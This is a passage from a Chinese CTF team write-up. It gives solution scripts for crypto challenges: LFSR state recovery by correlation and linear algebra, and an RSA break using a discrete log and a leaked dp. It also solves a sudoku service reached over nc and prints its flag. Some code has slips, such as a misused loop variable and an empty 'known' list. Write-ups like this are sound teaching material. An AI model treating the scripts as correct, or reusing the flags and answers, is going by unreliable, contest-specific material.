1111010000110110101111111001111011100001101100000001101111100100&quot;</span><br><span class="line"></span><br><span class="line">mask1=17638491756192425134</span><br><span class="line"></span><br><span class="line">mask2=14623996511862197922</span><br><span class="line"></span><br><span class="line">ans=[]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for i in range(1984):</span><br><span class="line"></span><br><span class="line">    gadget = int(output[i:i+64], 2)</span><br><span class="line"></span><br><span class="line">    l1=lfsr(gadget,mask1,64)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    cnt=0    </span><br><span class="line"></span><br><span class="line">    for j in range(i+64, 2048):</span><br><span class="line"></span><br><span class="line">        if l1.next()==int(output[j]):</span><br><span class="line"></span><br><span class="line">            cnt+=1</span><br><span class="line"></span><br><span class="line">    total=1984-i</span><br><span class="line"></span><br><span class="line">    ans.append((i, cnt / total))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ans.sort(key=lambda x:x[1], reverse=True)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ans2=[]</span><br><span class="line"></span><br><span class="line">for i, each in ans:</span><br><span class="line"></span><br><span class="line">    if each &gt; 0.85:</span><br><span class="line"></span><br><span class="line">        ans2.append((i,each))</span><br><span class="line"></span><br><span class="line">    else:</span><br><span class="line"></span><br><span class="line">        break</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ans2.sort(key=lambda x:x[0])</span><br><span class="line"></span><br><span class="line">idx = ans2[0][0]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">init1 = output[idx:idx+64]</span><br><span class="line"></span><br><span class="line">init1 = int(init1, 2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for _ in range(i):</span><br><span class="line"></span><br><span class="line">    init1 = backtrace(init1, mask1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for _ in range(64):</span><br><span class="line"></span><br><span class="line">    init1 = backtrace(init1, mask1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(init1)</span><br></pre></td></tr></table></figure>

<p>得到init1之后，output里与init1生成不一样的数据就是init2生成的数据。由于lfsr是可以用矩阵表示的，因此可以用矩阵方程：$init*A^{k-1}*mask$得到第k个输出。我们已知100多比特的输出，那么就可列$xA&#x3D;y$形式矩阵方程计算。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">M = block_matrix(Zmod(2), [Matrix([0] * 63), identity_matrix(63)], nrows = 2, subdivide = False)</span><br><span class="line"></span><br><span class="line">mask = mask2.digits(2)[::-1]</span><br><span class="line"></span><br><span class="line">mask = Matrix(Zmod(2), mask).T</span><br><span class="line"></span><br><span class="line">M = block_matrix(Zmod(2), [M, mask], ncols = 2, subdivide = False)</span><br><span class="line"></span><br><span class="line">known = </span><br><span class="line"></span><br><span class="line">A = []</span><br><span class="line"></span><br><span class="line">for idx, res in known:</span><br><span class="line"></span><br><span class="line">    A.append((M^i*mask).list())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">A = Matrix(Zmod(2), A).T</span><br><span class="line"></span><br><span class="line">y = vector(Zmod(2), [x[1] for x in known])</span><br><span class="line"></span><br><span class="line">print(A.solve_left(y))</span><br></pre></td></tr></table></figure>

<p>输出向量2进制转10进制即init2.</p>
<h3><span id="hardrsa">HardRSA</span><a href="#hardrsa" class="header-anchor"></a></h3><p>第一层base是2的dlp，求解出x之后，解个多项式root求出p，已知dp情况下在modp下求解即可。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">from hashlib import sha256</span><br><span class="line"></span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line"></span><br><span class="line">from tqdm import tqdm</span><br><span class="line"></span><br><span class="line">import gmpy2</span><br><span class="line"></span><br><span class="line">import math</span><br><span class="line"></span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line"></span><br><span class="line">from sage.modules.free_module_integer import IntegerLattice</span><br><span class="line"></span><br><span class="line">import itertools</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">y = 449703347709287328982446812318870158230369688625894307953604074502413258045265502496365998383562119915565080518077360839705004058211784369656486678307007348691991136610142919372779782779111507129101110674559235388392082113417306002050124215904803026894400155194275424834577942500150410440057660679460918645357376095613079720172148302097893734034788458122333816759162605888879531594217661921547293164281934920669935417080156833072528358511807757748554348615957977663784762124746554638152693469580761002437793837094101338408017407251986116589240523625340964025531357446706263871843489143068620501020284421781243879675292060268876353250854369189182926055204229002568224846436918153245720514450234433170717311083868591477186061896282790880850797471658321324127334704438430354844770131980049668516350774939625369909869906362174015628078258039638111064842324979997867746404806457329528690722757322373158670827203350590809390932986616805533168714686834174965211242863201076482127152571774960580915318022303418111346406295217571564155573765371519749325922145875128395909112254242027512400564855444101325427710643212690768272048881411988830011985059218048684311349415764441760364762942692722834850287985399559042457470942580456516395188637916303814055777357738894264037988945951468416861647204658893837753361851667573185920779272635885127149348845064478121843462789367112698673780005436144393573832498203659056909233757206537514290993810628872250841862059672570704733990716282248839</span><br><span class="line"></span><br><span class="line">dp = 379476973158146550831004952747643994439940435656483772269013081580532539640189020020958796514224150837680366977747272291881285391919167077726836326564473</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c = 57248258945927387673579467348106118747034381190703777861409527336272914559699490353325906672956273559867941402281438670652710909532261303394045079629146156340801932254839021574139943933451924062888426726353230757284582863993227592703323133265180414382062132580526658205716218046366247653881764658891315592607194355733209493239611216193118424602510964102026998674323685134796018596817393268106583737153516632969041693280725297929277751136040546830230533898514659714717213371619853137272515967067008805521051613107141555788516894223654851277785393355178114230929014037436770678131148140398384394716456450269539065009396311996040422853740049508500540281488171285233445744799680022307180452210793913614131646875949698079917313572873073033804639877699884489290120302696697425</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c1 = 78100131461872285613426244322737502147219485108799130975202429638042859488136933783498210914335741940761656137516033926418975363734194661031678516857040723532055448695928820624094400481464950181126638456234669814982411270985650209245687765595483738876975572521276963149542659187680075917322308512163904423297381635532771690434016589132876171283596320435623376283425228536157726781524870348614983116408815088257609788517986810622505961538812889953185684256469540369809863103948326444090715161351198229163190130903661874631020304481842715086104243998808382859633753938512915886223513449238733721777977175430329717970940440862059204518224126792822912141479260791232312544748301412636222498841676742208390622353022668320809201312724936862167350709823581870722831329406359010293121019764160016316259432749291142448874259446854582307626758650151607770478334719317941727680935243820313144829826081955539778570565232935463201135110049861204432285060029237229518297291679114165265808862862827211193711159152992427133176177796045981572758903474465179346029811563765283254777813433339892058322013228964103304946743888213068397672540863260883314665492088793554775674610994639537263588276076992907735153702002001005383321442974097626786699895993544581572457476437853778794888945238622869401634353220344790419326516836146140706852577748364903349138246106379954647002557091131475669295997196484548199507335421499556985949139162639560622973283109342746186994609598854386966520638338999059</span><br><span class="line"></span><br><span class="line">g = 2</span><br><span class="line"></span><br><span class="line">G = GF(y)</span><br><span class="line"></span><br><span class="line">x = log(G(c1), G(g))</span><br><span class="line"></span><br><span class="line">P.&lt;y&gt; = PolynomialRing(ZZ)</span><br><span class="line"></span><br><span class="line">f = 2019*y^2 + 2020*y^3 + 2021*y^4 - x</span><br><span class="line"></span><br><span class="line">p = int(f.roots()[0][0])</span><br><span class="line"></span><br><span class="line">m = int(pow(c, dp, p))</span><br><span class="line"></span><br><span class="line">print(long_to_bytes(m))</span><br></pre></td></tr></table></figure>





<h3><span id="mi-ma-ren-ji-he">密码人集合</span><a href="#mi-ma-ren-ji-he" class="header-anchor"></a></h3><p>ip: </p>
<p>82.157.25.233</p>
<p>port: 38700</p>
<p>protocol: tcp</p>
<p>nc连上 数独题 把汉字对应1-9编排 求出解</p>
<p><img src="./20211121175536861.jpg" alt="img"></p>
<blockquote>
<p>输入abcdefghi即可。</p>
</blockquote>
<blockquote>
<p>&gt; 请输入答案字符串：</p>
</blockquote>
<blockquote>
<p>拿要第我西湖论剑一湖西论剑要一我拿第一剑我论第拿要西湖第论湖要剑西一我拿西我要一拿第剑湖论剑一拿湖我论第要西要拿一第湖我西论剑论湖剑西一要拿第我我第西拿论剑湖一要</p>
</blockquote>
<blockquote>
<p>恭喜！答案正确，这是你的奖励DASCTF{b883513d6d97e0e9e8a3e4dc28b02621}。</p>
</blockquote>
<blockquote>
<p>继续开启下一站的旅程吧。</p>
</blockquote>
<p>转换为汉字输出即可拿到flag b883513d6d97e0e9e8a3e4dc28b02621</p>
</div><div class="article-licensing box"><div class="licensing-title"><p>2021年西湖论剑线上赛 SU Write-up</p><p><a href="https://team-su.github.io/2021/11/21/2021-11-20-XHLJ/">https://team-su.github.io/2021/11/21/2021-11-20-XHLJ/</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>Author</h6><p>SUers</p></div></div><div class="level-item is-narrow"><div><h6>Posted on</h6><p>2021-11-21</p></div></div><div class="level-item is-narrow"><div><h6>Updated on</h6><p>2025-06-09</p></div></div><div class="level-item is-narrow"><div><h6>Licensed under</h6><p><a class="icons" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="icon fab fa-creative-commons"></i></a><a class="icons" rel="noopener" target="_blank" title="Attribution" href="https://creativecommons.org/licenses/by/4.0/"><i class="icon fab fa-creative-commons-by"></i></a><a class="icons" rel="noopener" target="_blank" title="Noncommercial" href="https://creativecommons.org/licenses/by-nc/4.0/"><i class="icon fab fa-creative-commons-nc"></i></a></p></div></div></div></div></div><!--!--></article></div><!--!--><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/2021/12/24/2021-RCTF-Harmony-Writeup/"><i class="level-item fas fa-chevron-left"></i><span class="level-item">2021 RCTF Harmony Writeup</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/2021/10/26/2021-10-24-NTFY/"><span class="level-item">第四届“强网”拟态防御国际精英挑战赛 SU Write-Up</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><!--!--></div><!--!--><div class="column column-right  order-3 is-sticky"><!--!--></div></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/SU4.jpg" alt="su-team" height="28"></a><p class="is-size-7"><span>&copy; 2025 SUers</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p><p class="is-size-7">© 2016</p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/team-su"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("en");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script data-pjax src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="Back to top" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script data-pjax src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.js" defer></script><script>window.addEventListener("load", () => {
      window.cookieconsent.initialise({
        type: "info",
        theme: "edgeless",
        static: false,
        position: "bottom-left",
        content: {
          message: "This website uses cookies to improve your experience.",
          dismiss: "Got it!",
          allow: "Allow cookies",
          deny: "Decline",
          link: "Learn more",
          policy: "Cookie Policy",
          href: "https://www.cookiesandyou.com/",
        },
        palette: {
          popup: {
            background: "#edeff5",
            text: "#838391"
          },
          button: {
            background: "#4b81e8"
          },
        },
      });
    });</script><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.min.js"></script><script src="/js/pjax.js"></script><!--!--><!--!--><!--!--><script data-pjax src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="Type something..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script data-pjax src="/js/insight.js" defer></script><script data-pjax>document.addEventListener('DOMContentLoaded', function () {
            loadInsight({"contentUrl":"/content.json"}, {"hint":"Type something...","untitled":"(Untitled)","posts":"Posts","pages":"Pages","categories":"Categories","tags":"Tags"});
        });</script></body></html>